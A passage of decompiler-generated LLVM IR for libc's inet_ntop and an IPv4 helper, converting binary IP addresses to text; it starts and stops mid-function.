  store i32 %v6_80572c1, i32* %edi.global-to-local, align 4
  %v2_80572c2 = inttoptr i32 %v6_80572c1 to i32*
  store i32 0, i32* %v2_80572c2, align 4
  %v3_80572c2 = load i32, i32* %edi.global-to-local, align 4
  %v6_80572c2 = add i32 %v3_80572c2, 4
  store i32 %v6_80572c2, i32* %edi.global-to-local, align 4
  %v0_80572c3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80572c3 = inttoptr i32 %v6_80572c2 to i32*
  store i32 %v0_80572c3, i32* %v2_80572c3, align 4
  %v3_80572c3 = load i32, i32* %edi.global-to-local, align 4
  %v6_80572c3 = add i32 %v3_80572c3, 4
  store i32 %v6_80572c3, i32* %edi.global-to-local, align 4
  %v0_80572c4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80572c4 = trunc i32 %v0_80572c4 to i16
  %v3_80572c4 = inttoptr i32 %v6_80572c3 to i16*
  store i16 %v1_80572c4, i16* %v3_80572c4, align 2
  %v4_80572c4 = load i32, i32* %edi.global-to-local, align 4
  %v7_80572c4 = add i32 %v4_80572c4, 2
  store i32 %v7_80572c4, i32* %edi.global-to-local, align 4
  %v0_80572c6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80572c6 = trunc i32 %v0_80572c6 to i8
  %v3_80572c6 = inttoptr i32 %v7_80572c4 to i8*
  store i8 %v1_80572c6, i8* %v3_80572c6, align 1
  %v0_805735626 = load i32, i32* %ebp.global-to-local, align 4
  %v7_805735929 = icmp sgt i32 %v0_805735626, 3
  br i1 %v7_805735929, label %dec_label_pc_805735f, label %dec_label_pc_80572cc

dec_label_pc_80572cc:                             ; preds = %entry, %dec_label_pc_8057334
  %v0_805735630 = phi i32 [ %v0_8057356, %dec_label_pc_8057334 ], [ %v0_805735626, %entry ]
  %v0_80572d0 = load i32, i32* @ecx, align 4
  %v1_80572d0 = and i32 %v0_80572d0, -256
  %v2_80572d0 = or i32 %v1_80572d0, 100
  store i32 %v2_80572d0, i32* %ecx.global-to-local, align 4
  %v2_80572d2 = add i32 %v0_805735630, %v0_80572a2
  store i32 %v2_80572d2, i32* %eax.global-to-local, align 4
  %v0_80572d4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80572d4 = add i32 %v0_80572d4, 1
  store i32 %v1_80572d4, i32* @esi, align 4
  store i32 %v0_80572d4, i32* @edi, align 4
  %v1_80572dd = inttoptr i32 %v2_80572d2 to i8*
  %v2_80572dd = load i8, i8* %v1_80572dd, align 1
  %v3_80572dd = zext i8 %v2_80572dd to i32
  %v4_80572dd = load i32, i32* @edx, align 4
  %v5_80572dd = and i32 %v4_80572dd, -65536
  %v6_80572dd = or i32 %v5_80572dd, %v3_80572dd
  store i32 %v6_80572dd, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_80572dd, 100
  %v6_80572e3 = zext i8 %div to i32
  %v4_80572e5 = or i32 %v6_80572e3, %v1_80572d0
  store i32 %v4_80572e5, i32* %ecx.global-to-local, align 4
  %v1_80572e7 = or i32 %v4_80572e5, 48
  store i32 %v1_80572e7, i32* %eax.global-to-local, align 4
  %v1_80572ea = trunc i32 %v1_80572e7 to i8
  %v2_80572ea = load i32, i32* @esp, align 4
  %v4_80572ea = add i32 %v0_80572d4, 43
  %v5_80572ea = add i32 %v4_80572ea, %v2_80572ea
  %v6_80572ea = inttoptr i32 %v5_80572ea to i8*
  store i8 %v1_80572ea, i8* %v6_80572ea, align 1
  %v0_80572ee = load i32, i32* %eax.global-to-local, align 4
  %v1_80572ee = trunc i32 %v0_80572ee to i8
  %v7_80572ee = icmp eq i8 %v1_80572ee, 48
  %v1_80572f0 = icmp eq i1 %v7_80572ee, false
  %v0_8057316 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8057316 = and i32 %v0_8057316, -256
  %v2_8057316 = or i32 %v1_8057316, 10
  store i32 %v2_8057316, i32* %ecx.global-to-local, align 4
  %v0_8057318 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8057318, i32* %eax.global-to-local, align 4
  %v3_805731a = trunc i32 %v0_8057318 to i16
  %v5_805731a = udiv i16 %v3_805731a, 10
  br i1 %v1_80572f0, label %dec_label_pc_8057316, label %dec_label_pc_80572f2

dec_label_pc_80572f2:                             ; preds = %dec_label_pc_80572cc
  %v9_80572f6 = and i32 %v0_8057318, -65536
  %tmp = urem i16 %v5_805731a, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div32 = udiv i16 %tmp, 10
  %v7_8057303 = zext i16 %div32 to i32
  %v11_8057303 = or i32 %v7_8057303, %v9_80572f6
  store i32 %v11_8057303, i32* %eax.global-to-local, align 4
  %tmp34 = urem i16 %tmp, 10
  %v12_8057303 = zext i16 %tmp34 to i32
  %v1_8057306 = or i32 %v12_8057303, 48
  %v8_8057306 = trunc i32 %v1_8057306 to i8
  store i32 %v1_8057306, i32* %edx.global-to-local, align 4
  %v2_8057309 = load i32, i32* @esp, align 4
  %v3_8057309 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8057309 = add i32 %v2_8057309, 43
  %v5_8057309 = add i32 %v4_8057309, %v3_8057309
  %v6_8057309 = inttoptr i32 %v5_8057309 to i8*
  store i8 %v8_8057306, i8* %v6_8057309, align 1
  %v0_805730d = load i32, i32* %edx.global-to-local, align 4
  %v1_805730d = trunc i32 %v0_805730d to i8
  %v7_805730d = icmp eq i8 %v1_805730d, 48
  br i1 %v7_805730d, label %dec_label_pc_8057334, label %dec_label_pc_8057312

dec_label_pc_8057312:                             ; preds = %dec_label_pc_80572f2
  %v0_8057312 = load i32, i32* @esi, align 4
  store i32 %v0_8057312, i32* @edi, align 4
  br label %dec_label_pc_8057334

dec_label_pc_8057316:                             ; preds = %dec_label_pc_80572cc
  %tmp35 = urem i16 %v5_805731a, 256
  %v3_805731c = and i32 %v0_8057318, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div33 = udiv i16 %tmp35, 10
  %v7_8057327 = zext i16 %div33 to i32
  %v11_8057327 = or i32 %v7_8057327, %v3_805731c
  store i32 %v11_8057327, i32* %eax.global-to-local, align 4
  %tmp36 = urem i16 %tmp35, 10
  %v12_8057327 = zext i16 %tmp36 to i32
  %v1_805732a = or i32 %v12_8057327, 48
  %v8_805732a = trunc i32 %v1_805732a to i8
  store i32 %v1_805732a, i32* %edx.global-to-local, align 4
  %v0_805732d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805732d = add i32 %v0_805732d, 2
  store i32 %v1_805732d, i32* @edi, align 4
  %v2_8057330 = load i32, i32* @esp, align 4
  %v3_8057330 = load i32, i32* @esi, align 4
  %v4_8057330 = add i32 %v2_8057330, 43
  %v5_8057330 = add i32 %v4_8057330, %v3_8057330
  %v6_8057330 = inttoptr i32 %v5_8057330 to i8*
  store i8 %v8_805732a, i8* %v6_8057330, align 1
  br label %dec_label_pc_8057334

dec_label_pc_8057334:                             ; preds = %dec_label_pc_80572f2, %dec_label_pc_8057312, %dec_label_pc_8057316
  store i32 %v2_80572d2, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_805733d = load i32, i32* @edi, align 4
  %v1_805733d = add i32 %v0_805733d, 2
  store i32 %v1_805733d, i32* %ebx.global-to-local, align 4
  %v0_8057340 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8057340 = add i32 %v0_8057340, 1
  store i32 %v1_8057340, i32* %ebp.global-to-local, align 4
  %v2_8057341 = load i8, i8* %v1_80572dd, align 1
  %v3_8057341 = zext i8 %v2_8057341 to i32
  %v4_8057341 = load i32, i32* %eax.global-to-local, align 4
  %v5_8057341 = and i32 %v4_8057341, -65536
  %v6_8057341 = or i32 %v5_8057341, %v3_8057341
  store i32 %v6_8057341, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8057347 = load i32, i32* @esp, align 4
  %v2_8057347 = add i32 %v0_805733d, 44
  %v3_8057347 = add i32 %v2_8057347, %v0_8057347
  %v4_8057347 = inttoptr i32 %v3_8057347 to i8*
  store i8 46, i8* %v4_8057347, align 1
  %v0_805734c = load i32, i32* @ecx, align 4
  %v1_805734c = load i32, i32* %eax.global-to-local, align 4
  %v2_805734c = urem i32 %v1_805734c, 65536
  %v3_805734c = load i32, i32* %edx.global-to-local, align 4
  %v4_805734c = mul i32 %v3_805734c, 65536
  %v5_805734c = or i32 %v4_805734c, %v2_805734c
  %v6_805734c = urem i32 %v0_805734c, 65536
  %v7_805734c = udiv i32 %v5_805734c, %v6_805734c
  %v8_805734c = urem i32 %v7_805734c, 65536
  %v10_805734c = and i32 %v1_805734c, -65536
  %v11_805734c = or i32 %v8_805734c, %v10_805734c
  store i32 %v11_805734c, i32* %eax.global-to-local, align 4
  %v12_805734c = urem i32 %v5_805734c, %v6_805734c
  %v14_805734c = and i32 %v3_805734c, -65536
  %v15_805734c = or i32 %v12_805734c, %v14_805734c
  %v1_805734f = add i32 %v15_805734c, 48
  %v8_805734f = trunc i32 %v1_805734f to i8
  store i32 %v1_805734f, i32* @edx, align 4
  %v2_8057352 = load i32, i32* @esp, align 4
  %v3_8057352 = load i32, i32* @edi, align 4
  %v4_8057352 = add i32 %v2_8057352, 43
  %v5_8057352 = add i32 %v4_8057352, %v3_8057352
  %v6_8057352 = inttoptr i32 %v5_8057352 to i8*
  store i8 %v8_805734f, i8* %v6_8057352, align 1
  %v0_8057356 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8057359 = icmp sgt i32 %v0_8057356, 3
  br i1 %v7_8057359, label %dec_label_pc_805735f, label %dec_label_pc_80572cc

dec_label_pc_805735f:                             ; preds = %dec_label_pc_8057334, %entry
  %v0_805735f = load i32, i32* @esp, align 4
  %v1_805735f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805735f = add i32 %v0_805735f, 42
  %v3_805735f = add i32 %v2_805735f, %v1_805735f
  %v4_805735f = inttoptr i32 %v3_805735f to i8*
  store i8 0, i8* %v4_805735f, align 1
  %v2_8057367 = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_8057367, i32* %ebx.global-to-local, align 4
  %tmp23 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp23, i8** %stack_var_-92, align 4
  %v3_805736c = call i32 @strlen(i8* %tmp23)
  store i32 %v3_805736c, i32* @eax, align 4
  %tmp31 = icmp ugt i32 %v3_805736c, %v0_80572bb
  br i1 %tmp31, label %dec_label_pc_805737a, label %dec_label_pc_8057389

dec_label_pc_805737a:                             ; preds = %dec_label_pc_805735f
  %v0_805737a = load i8*, i8** %stack_var_-92, align 4
  %v1_805737a = ptrtoint i8* %v0_805737a to i32
  %v2_805737a = call i32 @__errno_location(i32 %v1_805737a)
  %v1_805737f = inttoptr i32 %v2_805737a to i32*
  store i32 28, i32* %v1_805737f, align 4
  br label %dec_label_pc_8057398

dec_label_pc_8057389:                             ; preds = %dec_label_pc_805735f
  %tmp24 = bitcast i8** %stack_var_-60 to i32*
  %v3_805738c5 = load i32, i32* %tmp24, align 4
  %tmp25 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_805738c5, i32* %tmp25, align 4
  %v0_8057390.cast = inttoptr i32 %v3_805738c5 to i8*
  %v4_8057390 = call i32 @strcpy(i8* %v0_8057390.cast, i32 %v2_8057367)
  br label %dec_label_pc_8057398

dec_label_pc_8057398:                             ; preds = %dec_label_pc_805737a, %dec_label_pc_8057389
  %storemerge = phi i32 [ %v4_8057390, %dec_label_pc_8057389 ], [ 0, %dec_label_pc_805737a ]
  %v0_805739f = phi i32 [ %v4_8057390, %dec_label_pc_8057389 ], [ 0, %dec_label_pc_805737a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805729a, i32* @esi, align 4
  store i32 %v0_8057299, i32* @edi, align 4
  ret i32 %v0_805739f

; uselistorder directives
  uselistorder i32 %v0_8057356, { 1, 0 }
  uselistorder i32 %v3_805734c, { 1, 0 }
  uselistorder i32 %v1_805734c, { 1, 0 }
  uselistorder i32 %v1_805732a, { 1, 0 }
  uselistorder i32 %v1_8057306, { 1, 0 }
  uselistorder i32 %v0_8057318, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80572e7, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 10, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8 48, { 2, 3, 12, 14, 4, 5, 6, 9, 8, 7, 10, 0, 11, 1, 13 }
  uselistorder i32 43, { 3, 4, 5, 6, 1, 7, 2, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 100, { 5, 1, 3, 4, 2, 0 }
  uselistorder i32 -65536, { 2, 3, 4, 1, 0, 5, 6, 10, 11, 7, 8, 9 }
  uselistorder i1* @df, { 4, 44, 45, 0, 1, 46, 47, 48, 51, 2, 3, 56, 57, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 49, 50, 52, 53, 54, 55 }
  uselistorder label %dec_label_pc_8057398, { 1, 0 }
  uselistorder label %dec_label_pc_8057334, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80572cc, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_80573a1 = load i32, i32* @edi, align 4
  %v0_80573a2 = load i32, i32* @esi, align 4
  %v0_80573a3 = load i32, i32* @ebx, align 4
  %v15_80573a4 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_80573ab = icmp eq i32 %arg1, 2
  br i1 %v9_80573ab, label %dec_label_pc_80573bb, label %dec_label_pc_80573b0

dec_label_pc_80573b0:                             ; preds = %entry
  %v9_80573b0 = icmp eq i32 %arg1, 10
  %v1_80573b3 = icmp eq i1 %v9_80573b0, false
  br i1 %v1_80573b3, label %dec_label_pc_8057557, label %dec_label_pc_80573d3

dec_label_pc_80573bb:                             ; preds = %entry
  %v4_80573bb = ptrtoint i8* %arg3 to i32
  store i32 %v4_80573bb, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_80573c7 = call i32 @inet_ntop4(i32 %v0_80573a3, i32 %v0_80573a2, i32 %v0_80573a1)
  store i32 %v3_80573c7, i32* %eax.global-to-local, align 4
  store i32 %v3_80573c7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057564

dec_label_pc_80573d3:                             ; preds = %dec_label_pc_80573b0
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_80573d8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_80573d8, i32* %eax.global-to-local, align 4
  %tmp44 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp44, i8** %stack_var_-124, align 4
  %v6_80573dd = call i32 @__GI_memset(i8* %tmp44, i32 0, i32 32)
  store i32 %v6_80573dd, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_80573ff = add i32 %arg2, 1
  br label %dec_label_pc_80573e9

dec_label_pc_80573e9:                             ; preds = %dec_label_pc_80573e9.dec_label_pc_80573e9_crit_edge, %dec_label_pc_80573d3
  %v1_805740c = phi i32 [ %v15_80573a4, %dec_label_pc_80573d3 ], [ %v1_805740c.pre, %dec_label_pc_80573e9.dec_label_pc_80573e9_crit_edge ]
  %v0_805740773 = phi i32 [ 0, %dec_label_pc_80573d3 ], [ %v0_8057410.pre, %dec_label_pc_80573e9.dec_label_pc_80573e9_crit_edge ]
  %v1_80573f2 = ashr i32 %v0_805740773, 31
  %v2_80573f3 = zext i32 %v0_805740773 to i64
  %v4_80573f3 = zext i32 %v1_80573f2 to i64
  %v5_80573f3 = mul nuw i64 %v4_80573f3, 4294967296
  %v6_80573f3 = or i64 %v5_80573f3, %v2_80573f3
  %v8_80573f3 = sdiv i64 %v6_80573f3, 2
  %v9_80573f3 = trunc i64 %v8_80573f3 to i32
  store i32 %v9_80573f3, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_80573f3, i32* %ebx.global-to-local, align 4
  %v2_80573fb = add i32 %v0_805740773, %arg2
  %v3_80573fb = inttoptr i32 %v2_80573fb to i8*
  %v4_80573fb = load i8, i8* %v3_80573fb, align 1
  %v5_80573fb = zext i8 %v4_80573fb to i32
  store i32 %v5_80573fb, i32* %eax.global-to-local, align 4
  %v3_80573ff = add i32 %v2_80573ff, %v0_805740773
  %v4_80573ff = inttoptr i32 %v3_80573ff to i8*
  %v5_80573ff = load i8, i8* %v4_80573ff, align 1
  %v6_80573ff = zext i8 %v5_80573ff to i32
  store i32 %v6_80573ff, i32* %edx.global-to-local, align 4
  %v2_8057404 = mul nuw nsw i32 %v5_80573fb, 256
  %v1_8057407 = add i32 %v0_805740773, 2
  store i32 %v1_8057407, i32* %ecx.global-to-local, align 4
  %v2_805740a = or i32 %v6_80573ff, %v2_8057404
  store i32 %v2_805740a, i32* %eax.global-to-local, align 4
  %v3_805740c = mul i32 %v9_80573f3, 4
  %v4_805740c = add i32 %v3_805740c, 60
  %v5_805740c = add i32 %v4_805740c, %v1_805740c
  %v6_805740c = inttoptr i32 %v5_805740c to i32*
  store i32 %v2_805740a, i32* %v6_805740c, align 4
  %v0_8057410.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8057413 = icmp sgt i32 %v0_8057410.pre, 15
  br i1 %v7_8057413, label %dec_label_pc_8057415, label %dec_label_pc_80573e9.dec_label_pc_80573e9_crit_edge

dec_label_pc_80573e9.dec_label_pc_80573e9_crit_edge: ; preds = %dec_label_pc_80573e9
  %v1_805740c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80573e9

dec_label_pc_8057415:                             ; preds = %dec_label_pc_80573e9
  %v4_80573d3 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805741f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805741f

dec_label_pc_805741f:                             ; preds = %dec_label_pc_8057415, %dec_label_pc_805744c
  %v0_805744c72 = phi i32 [ 0, %dec_label_pc_8057415 ], [ %v1_805744c, %dec_label_pc_805744c ]
  %v0_805743771 = phi i32 [ -1, %dec_label_pc_8057415 ], [ %v0_80574379, %dec_label_pc_805744c ]
  %v0_805745770 = phi i32 [ -1, %dec_label_pc_8057415 ], [ %v0_805743c10, %dec_label_pc_805744c ]
  %v0_805746269 = phi i32 [ -1, %dec_label_pc_8057415 ], [ %v0_805744714, %dec_label_pc_805744c ]
  %v2_805741f = mul nuw nsw i32 %v0_805744c72, 4
  %v3_805741f = add nuw nsw i32 %v2_805741f, 60
  %v4_805741f = add i32 %v3_805741f, %v0_805741f.pre
  %v5_805741f = inttoptr i32 %v4_805741f to i32*
  %v6_805741f = load i32, i32* %v5_805741f, align 4
  %v7_805741f = icmp eq i32 %v6_805741f, 0
  %v1_8057424 = icmp eq i1 %v7_805741f, false
  %v10_8057437 = icmp eq i32 %v0_805743771, -1
  br i1 %v1_8057424, label %dec_label_pc_8057437, label %dec_label_pc_8057426

dec_label_pc_8057426:                             ; preds = %dec_label_pc_805741f
  %v1_8057429 = icmp eq i1 %v10_8057437, false
  br i1 %v1_8057429, label %dec_label_pc_8057434, label %dec_label_pc_805742b

dec_label_pc_805742b:                             ; preds = %dec_label_pc_8057426
  store i32 %v0_805744c72, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805744c

dec_label_pc_8057434:                             ; preds = %dec_label_pc_8057426
  %v0_8057434 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057434 = add i32 %v0_8057434, 1
  store i32 %v1_8057434, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805744c

dec_label_pc_8057437:                             ; preds = %dec_label_pc_805741f
  br i1 %v10_8057437, label %dec_label_pc_805744c, label %dec_label_pc_805743c

dec_label_pc_805743c:                             ; preds = %dec_label_pc_8057437
  %v10_805743c = icmp eq i32 %v0_805745770, -1
  %v0_8057445.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057441 = load i32, i32* @ebp, align 4
  %v7_8057443 = icmp sgt i32 %v0_8057445.pre, %v1_8057441
  %or.cond = or i1 %v10_805743c, %v7_8057443
  br i1 %or.cond, label %dec_label_pc_8057445, label %dec_label_pc_8057449

dec_label_pc_8057445:                             ; preds = %dec_label_pc_805743c
  store i32 %v0_8057445.pre, i32* @ebp, align 4
  store i32 %v0_805746269, i32* @edi, align 4
  br label %dec_label_pc_8057449

dec_label_pc_8057449:                             ; preds = %dec_label_pc_805743c, %dec_label_pc_8057445
  %v0_805743c12 = phi i32 [ %v0_805746269, %dec_label_pc_8057445 ], [ %v0_805745770, %dec_label_pc_805743c ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805744c

dec_label_pc_805744c:                             ; preds = %dec_label_pc_8057437, %dec_label_pc_8057434, %dec_label_pc_805742b, %dec_label_pc_8057449
  %v0_805744714 = phi i32 [ %v0_805746269, %dec_label_pc_8057437 ], [ %v0_805746269, %dec_label_pc_8057434 ], [ %v0_805744c72, %dec_label_pc_805742b ], [ -1, %dec_label_pc_8057449 ]
  %v0_80574379 = phi i32 [ -1, %dec_label_pc_8057437 ], [ %v0_805743771, %dec_label_pc_8057434 ], [ %v0_805744c72, %dec_label_pc_805742b ], [ -1, %dec_label_pc_8057449 ]
  %v0_805743c10 = phi i32 [ %v0_805745770, %dec_label_pc_8057437 ], [ %v0_805745770, %dec_label_pc_8057434 ], [ %v0_805745770, %dec_label_pc_805742b ], [ %v0_805743c12, %dec_label_pc_8057449 ]
  %v1_805744c = add nuw nsw i32 %v0_805744c72, 1
  store i32 %v1_805744c, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_805744c, 8
  br i1 %exitcond, label %dec_label_pc_8057452, label %dec_label_pc_805741f

dec_label_pc_8057452:                             ; preds = %dec_label_pc_805744c
  %v10_8057452 = icmp eq i32 %v0_805744714, -1
  br i1 %v10_8057452, label %dec_label_pc_8057464, label %dec_label_pc_8057457

dec_label_pc_8057457:                             ; preds = %dec_label_pc_8057452
  %v10_8057457 = icmp eq i32 %v0_805743c10, -1
  %v0_8057460.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8057457, label %dec_label_pc_8057460, label %dec_label_pc_805745c

dec_label_pc_805745c:                             ; preds = %dec_label_pc_8057457
  %v1_805745c = load i32, i32* @ebp, align 4
  %v7_805745e = icmp sgt i32 %v0_8057460.pre, %v1_805745c
  br i1 %v7_805745e, label %dec_label_pc_8057460, label %dec_label_pc_8057464.thread

dec_label_pc_8057464.thread:                      ; preds = %dec_label_pc_805745c
  br label %dec_label_pc_8057469

dec_label_pc_8057460:                             ; preds = %dec_label_pc_8057457, %dec_label_pc_805745c
  store i32 %v0_8057460.pre, i32* @ebp, align 4
  store i32 %v0_805744714, i32* @edi, align 4
  br label %dec_label_pc_8057464

dec_label_pc_8057464:                             ; preds = %dec_label_pc_8057452, %dec_label_pc_8057460
  %v0_8057464 = phi i32 [ %v0_805743c10, %dec_label_pc_8057452 ], [ %v0_805744714, %dec_label_pc_8057460 ]
  %v10_8057464 = icmp eq i32 %v0_8057464, -1
  br i1 %v10_8057464, label %dec_label_pc_8057471, label %dec_label_pc_8057464.dec_label_pc_8057469_crit_edge

dec_label_pc_8057464.dec_label_pc_8057469_crit_edge: ; preds = %dec_label_pc_8057464
  %v0_8057469.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8057469

dec_label_pc_8057469:                             ; preds = %dec_label_pc_8057464.dec_label_pc_8057469_crit_edge, %dec_label_pc_8057464.thread
  %v0_8057469 = phi i32 [ %v1_805745c, %dec_label_pc_8057464.thread ], [ %v0_8057469.pre, %dec_label_pc_8057464.dec_label_pc_8057469_crit_edge ]
  %v0_805746450 = phi i32 [ %v0_805743c10, %dec_label_pc_8057464.thread ], [ %v0_8057464, %dec_label_pc_8057464.dec_label_pc_8057469_crit_edge ]
  %v1_8057469 = add i32 %v0_8057469, -1
  %v6_8057469 = sub i32 0, %v0_8057469
  %v7_8057469 = and i32 %v0_8057469, %v6_8057469
  %v8_8057469 = icmp slt i32 %v7_8057469, 0
  %v9_8057469 = icmp eq i32 %v1_8057469, 0
  %v10_8057469 = icmp slt i32 %v1_8057469, 0
  %v3_805746c = icmp eq i1 %v10_8057469, %v8_8057469
  %v4_805746c = icmp eq i1 %v9_8057469, false
  %v5_805746c = and i1 %v4_805746c, %v3_805746c
  br i1 %v5_805746c, label %dec_label_pc_8057471, label %dec_label_pc_805746e

dec_label_pc_805746e:                             ; preds = %dec_label_pc_8057469
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8057471

dec_label_pc_8057471:                             ; preds = %dec_label_pc_8057469, %dec_label_pc_8057464, %dec_label_pc_805746e
  %v0_805751119 = phi i32 [ %v0_805746450, %dec_label_pc_8057469 ], [ -1, %dec_label_pc_8057464 ], [ -1, %dec_label_pc_805746e ]
  %v2_8057471 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8057471, i32* @ebx, align 4
  %v3_80574f3 = add i32 %v4_80573d3, 64
  %v12_80574b1 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805751162 = icmp eq i32 %v0_805751119, -1
  %v1_80574b9 = icmp eq i1 %v12_80574b1, false
  br label %dec_label_pc_805747c

dec_label_pc_805747c:                             ; preds = %dec_label_pc_8057471, %dec_label_pc_8057507
  %v10_805751168 = phi i1 [ %v10_805751162, %dec_label_pc_8057471 ], [ %v10_8057511, %dec_label_pc_8057507 ]
  %v0_805749667 = phi i32 [ 0, %dec_label_pc_8057471 ], [ %v1_8057507, %dec_label_pc_8057507 ]
  %v1_805748c66 = phi i32 [ %v0_805751119, %dec_label_pc_8057471 ], [ %v0_8057511.pre, %dec_label_pc_8057507 ]
  %v0_805749a65 = phi i32 [ %v2_8057471, %dec_label_pc_8057471 ], [ %v0_805749020, %dec_label_pc_8057507 ]
  %stack_var_-120.164 = phi i8* [ null, %dec_label_pc_8057471 ], [ %stack_var_-120.0, %dec_label_pc_8057507 ]
  %stack_var_-116.163 = phi i32 [ 32, %dec_label_pc_8057471 ], [ %stack_var_-116.0, %dec_label_pc_8057507 ]
  br i1 %v10_805751168, label %dec_label_pc_8057496, label %dec_label_pc_8057481

dec_label_pc_8057481:                             ; preds = %dec_label_pc_805747c
  %v12_8057481 = icmp eq i32 %v0_805749667, %v1_805748c66
  %v5_8057483 = icmp slt i32 %v0_805749667, %v1_805748c66
  br i1 %v5_8057483, label %dec_label_pc_8057496, label %dec_label_pc_8057485

dec_label_pc_8057485:                             ; preds = %dec_label_pc_8057481
  %v1_8057485 = load i32, i32* @ebp, align 4
  %v2_8057485 = add i32 %v1_8057485, %v1_805748c66
  store i32 %v2_8057485, i32* %eax.global-to-local, align 4
  %v5_805748a = icmp slt i32 %v0_805749667, %v2_8057485
  br i1 %v5_805748a, label %dec_label_pc_805748c, label %dec_label_pc_8057496

dec_label_pc_805748c:                             ; preds = %dec_label_pc_8057485
  %v1_805748e = icmp eq i1 %v12_8057481, false
  br i1 %v1_805748e, label %dec_label_pc_8057507, label %dec_label_pc_8057490

dec_label_pc_8057490:                             ; preds = %dec_label_pc_805748c
  %v1_8057490 = inttoptr i32 %v0_805749a65 to i8*
  store i8 58, i8* %v1_8057490, align 1
  %v0_8057493 = load i32, i32* @ebx, align 4
  %v1_8057493 = add i32 %v0_8057493, 1
  store i32 %v1_8057493, i32* @ebx, align 4
  br label %dec_label_pc_8057507

dec_label_pc_8057496:                             ; preds = %dec_label_pc_8057485, %dec_label_pc_8057481, %dec_label_pc_805747c
  %v1_8057496 = icmp eq i32 %v0_805749667, 0
  br i1 %v1_8057496, label %dec_label_pc_805749e.thread, label %dec_label_pc_805749e

dec_label_pc_805749e.thread:                      ; preds = %dec_label_pc_8057496
  br label %dec_label_pc_80574f2

dec_label_pc_805749e:                             ; preds = %dec_label_pc_8057496
  %v1_805749a = inttoptr i32 %v0_805749a65 to i8*
  store i8 58, i8* %v1_805749a, align 1
  %v0_805749d = load i32, i32* @ebx, align 4
  %v1_805749d = add i32 %v0_805749d, 1
  store i32 %v1_805749d, i32* @ebx, align 4
  %v0_805749e.pre = load i32, i32* @esi, align 4
  %v9_805749e = icmp eq i32 %v0_805749e.pre, 6
  %v1_80574a1 = icmp eq i1 %v9_805749e, false
  br i1 %v1_80574a1, label %dec_label_pc_80574f2, label %dec_label_pc_80574a3

